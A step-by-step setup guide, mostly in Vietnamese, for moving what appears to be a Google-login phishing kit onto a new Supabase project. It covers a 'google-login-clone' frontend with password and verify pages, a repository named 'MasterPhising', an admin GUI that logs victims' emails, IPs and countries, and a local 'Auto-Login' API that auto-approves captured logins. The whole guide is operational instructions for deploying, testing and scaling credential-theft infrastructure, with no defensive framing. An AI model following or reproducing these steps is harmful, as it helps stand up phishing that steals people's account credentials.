# 🚀 NEW PROJECT SETUP GUIDE

## 📋 TỔNG QUAN

Thiết lập **Supabase project mới** với **Auto-Login integration** để tránh hỏng dự án cũ.

### **🎯 Project Info:**
- **Supabase Project**: `otbswtklpidhezziotac`  
- **URL**: https://supabase.com/dashboard/project/otbswtklpidhezziotac
- **GitHub**: https://github.com/MasterPhising/10musd
- **Version**: 2.1-AUTO-LOGIN-NEW-PROJECT-WITH-COUNTRY
- **Features**: Auto-Login + Country Detection + US Fallback

---

## 🛠️ CÁC BƯỚC SETUP

### **BƯỚC 1: SETUP DATABASE SCHEMA**

#### **1.1 Mở Supabase Dashboard**
- Vào: https://supabase.com/dashboard/project/otbswtklpidhezziotac
- Click: **SQL Editor**

#### **1.2 Chạy Database Schema**
- Copy toàn bộ nội dung từ file: `configs/supabase-schema-new-project.sql`
- Paste vào SQL Editor
- Click **"Run"**
- Verify: Có thông báo `SUCCESS: Database schema created...`

#### **1.3 Kiểm tra Tables:**
- Vào **Table Editor**
- Verify có table: `requests`
- Verify có sample data (2 test records)

---

### **BƯỚC 2: DEPLOY EDGE FUNCTIONS**

#### **2.1 Tạo Edge Function**
- Vào: **Edge Functions**
- Click: **"Create a new function"**
- Tên function: `admin-api`
- Click **"Create function"**

#### **2.2 Deploy Function Code**
- Xóa toàn bộ code template
- Copy toàn bộ nội dung từ file: `admin-api-new-project.txt`
- Paste vào editor
- Click **"Deploy"**

#### **2.3 Test Function**
- Click **"Invoke"** hoặc vào URL:
- `https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api/`
- **Expected response:**
```json
{
  "message": "NEW PROJECT ADMIN API WORKING! 🚀",
  "version": "2.1-AUTO-LOGIN-NEW-PROJECT-WITH-COUNTRY", 
  "project": "otbswtklpidhezziotac",
  "auto_login_enabled": true,
  "country_detection": true
}
```

---

### **BƯỚC 3: UPDATE FRONTEND (OPTIONAL)**

#### **3.1 Backup Frontend hiện tại**
```cmd
copy google-login-clone google-login-clone-backup
```

#### **3.2 Update Frontend URLs** (if needed)
- Include file: `google-login-clone/config-new-project.js` 
- Hoặc manually update các URLs trong:
  - `index.html`
  - `script.js` 
  - `password.js`
  - `verify.js`

**Replace URLs:**
```javascript
// OLD PROJECT
'https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api'

// NEW PROJECT  
'https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api'
```

---

### **BƯỚC 4: KHỞI ĐỘNG AUTO-LOGIN API**

#### **4.1 Start Auto-Login API Server**
```cmd
cd /d "D:\Google-Fontend-Backend\login-clone-main\login-clone-main\Auto-Login"
start_auto_login_api.bat
```

#### **4.2 Verify API hoạt động**
- Mở browser: `http://localhost:5000`
- **Expected**: `"AUTO-LOGIN API RUNNING! 🚀"`

---

### **BƯỚC 5: TEST HỆ THỐNG MỚI**

#### **5.1 Chạy Test Script**
```cmd
python test_new_project.py
```

#### **5.2 Expected Results:**
```
✅ PASS: API is running
✅ PASS: Email validation  
✅ PASS: New Supabase function working with country detection
✅ PASS: Database schema working
✅ PASS: Request created with Auto-Login and Country Detection
✅ PASS: Auto-approval working with country detection
✅ PASS: Country: United States (US) (Fallback or Real US)
```

#### **5.3 Test Manual qua Frontend**
1. Vào Google Clone website
2. Nhập email: `test@newproject.com`
3. Kiểm tra: Có auto approve trong 1-2 giây không?
4. Check Admin GUI: 
   - Có hiển thị request không?
   - Country có hiển thị (VD: "United States (US)") thay vì "Unknown"?
   - IP address có hiển thị correct không?

---

## 📊 VERIFY THÀNH CÔNG

### **✅ Checklist hoàn thành:**
- [ ] Database tables created (requests, functions, views)
- [ ] Edge function deployed và working  
- [ ] Auto-Login API running on port 5000
- [ ] Test script pass tất cả tests
- [ ] Frontend có thể connect đến new project
- [ ] Admin GUI hiển thị requests từ new project
- [ ] Auto approve/deny working

### **🎯 Kết quả mong đợi:**
- **Database**: Hoạt động với schema mới
- **API**: Auto approve/deny requests
- **Frontend**: Connect đến project mới
- **Admin GUI**: Monitor requests + auto-approval logs
- **Safety**: Dự án cũ không bị ảnh hưởng

---

## 🔧 TROUBLESHOOTING

### **❌ Problem: Database schema fail**
**Solution:**
1. Check permissions: Có service_role access không?
2. Check SQL syntax: Copy chính xác từ file?
3. Retry: Xóa tables và chạy lại script

### **❌ Problem: Edge function không deploy**
**Solution:**  
1. Check code syntax: TypeScript có lỗi không?
2. Check credentials: Service role key có đúng không?
3. Check logs: Function logs có error gì không?

### **❌ Problem: Auto-Login API không connect**
**Solution:**
1. Check API running: `http://localhost:5000` có work không?
2. Check firewall: Port 5000 có bị block không?
3. Check network: Supabase có call được localhost không?

### **❌ Problem: Frontend không connect new project**
**Solution:**
1. Check URLs: Có update đúng project ID không?
2. Check API keys: anon key có đúng cho new project không?
3. Check CORS: Edge function có enable CORS không?

---

## 🎯 NEXT STEPS

1. **Production Ready**: Scale up profiles pool nếu traffic cao
2. **Frontend Update**: Point frontend to new project permanently
3. **Admin GUI Update**: Point admin GUI to new project  
4. **Monitor Performance**: Track auto approval success rate
5. **Backup Strategy**: Export old project data nếu cần

---

## 📞 SUPPORT

**Nếu gặp vấn đề:**
1. Check từng bước theo guide này
2. Chạy test script: `python test_new_project.py`  
3. Check logs: Auto-Login API + Supabase Function logs
4. Verify URLs: Tất cả endpoints có point đến new project

**Files quan trọng:**
- `configs/supabase-schema-new-project.sql` - Database schema
- `admin-api-new-project.txt` - Edge function code  
- `test_new_project.py` - Test script
- `config-new-project.js` - Frontend config

---

**🎉 CHÚC MỪNG! New project đã sẵn sàng với Auto-Login integration!**

**Lợi ích:**
✅ Dự án cũ an toàn  
✅ Auto approve/deny hoạt động
✅ Performance tối ưu hơn
✅ Database schema mới nhất  
✅ GitHub integration sẵn sàng
✅ Country detection từ IP address
🇺🇸 Smart fallback: Unknown IPs → United States (US) 